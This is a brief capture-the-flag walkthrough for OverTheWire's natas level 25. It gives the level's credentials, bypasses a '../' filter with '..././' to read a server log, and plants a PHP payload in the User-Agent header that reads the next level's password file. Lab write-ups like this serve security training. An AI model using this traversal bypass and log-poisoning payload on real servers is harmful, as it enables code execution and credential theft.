# [natas 25](http://natas25.natas.labs.overthewire.org)

    Username: natas25
    Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c

"../" will be replaced by "" to prevent directory traversal attempt and the path can not contain "natas_webpass", So we can not get the password directly. But we can use the path below to read the log file.

    http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././tmp/natas25_8jakhjo908l6s3c1m5p10ckca0.log

Now we want to write the password in the log file. The log records HTTP_USER_AGENT, So we can inject some codes in it.
Let's set HTTP_USER_AGENT to be the following:

    <?php echo file_get_contents('/etc/natas_webpass/natas26') ?>

Then let it write the password in log and read the log again to get the password.

    [07.09.2015 13::48:32] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request." 

